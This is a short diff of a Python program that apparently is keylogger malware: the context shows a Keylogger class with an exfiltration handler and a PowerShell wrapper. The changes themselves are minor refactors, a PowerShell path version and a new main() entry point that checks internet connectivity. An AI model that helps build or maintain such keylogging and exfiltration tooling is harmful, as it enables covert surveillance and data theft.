@@ -102,7 +102,7 @@ class PowerShell(object):
             os.environ['SystemRoot'],
             'SysWOW64' if ctypes.sizeof(ctypes.c_void_p) == 4 else 'System32',
             'WindowsPowerShell',
-            'v2.0',
+            'v1.0',
             'powershell.exe')
 
     def run(self, command):
@@ -192,7 +192,11 @@ class Keylogger(object):
         self.exfil_handler.close()
 
 
-if __name__ == '__main__':
+def main():
     connectivity = check_internet()
     if not connectivity:
         sys.exit(1)
+
+
+if __name__ == '__main__':
+    main()
